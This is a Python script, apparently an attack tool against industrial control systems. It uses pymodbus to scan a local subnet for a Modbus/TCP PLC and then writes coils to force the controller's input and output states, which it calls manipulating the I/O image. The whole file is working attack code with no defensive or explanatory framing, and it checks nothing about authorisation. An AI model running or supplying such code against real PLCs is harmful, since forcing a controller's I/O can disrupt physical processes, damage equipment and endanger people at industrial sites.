import socket
import pymodbus
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the subnet to scan (e.g., 192.168.1.0/24)
    subnet = "192.168.1."
    for i in range(1, 255):
        ip = f"{subnet}{i}"
        try:
            # Attempt to connect to the PLC
            client = ModbusTcpClient(ip)
            client.connect()
            if client.is_socket_open():
                print(f"PLC found at IP: {ip}")
                client.close()
                return ip
        except ConnectionException:
            continue
    print("PLC not found in the specified subnet.")
    return None

# Function to manipulate the I/O image
def manipulate_io_image(plc_ip, input_address, output_address, input_value, output_value):
    try:
        client = ModbusTcpClient(plc_ip)
        client.connect()

        # Override the input status
        if input_address is not None:
            client.write_coil(input_address, input_value)

        # Override the output status
        if output_address is not None:
            client.write_coil(output_address, output_value)

        print("I/O image manipulation successful.")
    except ConnectionException as e:
        print(f"Connection error: {e}")
    finally:
        client.close()

# Main function
def main():
    # Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if plc_ip is None:
        return

    # Define the addresses and values to manipulate
    input_address = 0  # Example input address
    output_address = 1  # Example output address
    input_value = True  # Example input value (True or False)
    output_value = False  # Example output value (True or False)

    # Manipulate the I/O image
    manipulate_io_image(plc_ip, input_address, output_address, input_value, output_value)

if __name__ == "__main__":
    main()